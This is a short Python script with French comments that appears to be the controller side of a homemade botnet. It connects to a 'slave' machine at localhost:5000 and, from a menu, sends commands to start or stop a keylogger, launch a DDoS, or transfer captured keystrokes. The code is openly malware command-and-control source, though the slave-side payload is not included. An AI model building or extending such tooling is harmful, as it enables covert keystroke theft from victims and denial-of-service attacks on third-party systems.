#importation du module socket afin de permetttre une communication réseau
#importation  d'argparse afin de pouvoir créer des argument
import socket as modSocket
import argparse

"""
création de l'objet communication
avec le champ machineEsclave.
Création de 2 méthodes connexion et argument

connexion() va permettre d'établire une connexion avec
une machine esclave
dans le try: on essaiera d'établire une connexion
avec une machine distante.
le except: va print "erreur" si il n'y a pas eu de
connexion

"""
class Communication():

    def __init__(self, machineEsclave, s):
        self.machineEsclave = machineEsclave
        self.s = s

    def connexion(self, machineEsclave, s):
        
        try:
            s.connect(machineEsclave)
            print("Connecion établi avec l'esclave")
        except ConnectionRefusedError:
            print("Erreur de connexion")

"""
création de l'objet ChoixAction
avec le champ machineEsclave et s.
Création de pusieurs methodes afin de choisir l'action a faire
sur le slave
"""

class ChoixAction(Communication):

    def __init__(self, machineEsclave):
        self.machineEsclave = machineEsclave
        self.s = s
    
    def keylogger(self, s):
        print("Choix d'attaque : Keylogger. Signal envoyé")
        s.send("keylogger".encode("utf-8"))

    def ddos(self, s):
        print("Choix d'attaque : DDoS. Signal envoyé")
        s.send("ddos".encode("utf-8"))
    
    def stopKeyLogger(self, s):
        print("Choix d'attaque : stop keylogger. Signal envoyé")
        s.send("stop".encode("utf-8"))
    
    def  transfertKeyLogger(self, s):
        print("Choix d'attaque : Logger transfert du logger. Signal envoyé")
        s.send("transfert".encode("utf-8"))
        
    

machineEsclave = ("localhost", 5000)
s = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
a = ChoixAction(machineEsclave)
a.connexion(machineEsclave, s)

select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \nSélectionnez une option : "))
if select == 1:
    a.ddos(s)
elif select == 2:
    a.keylogger(s)
elif select == 3:
    a.stopKeyLogger(s)
elif select == 4:
    a.transfertKeyLogger(s)






    




